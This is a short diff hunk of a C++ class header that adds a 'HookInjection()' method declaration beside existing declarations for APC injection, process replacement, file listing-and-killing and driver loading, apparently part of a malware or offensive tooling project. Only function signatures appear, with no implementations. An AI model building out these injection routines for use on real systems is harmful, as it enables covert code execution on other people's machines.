@@ -34,6 +34,7 @@ public:
 	vector<wstring> list_n_kill_files(wstring path);
 	void LoadDriverBeep();
 	BOOL APCinjection(string target, TCHAR *dll_name);
+	BOOL HookInjection();
 	BOOL ProcReplace(string inj_exe);
 };
 
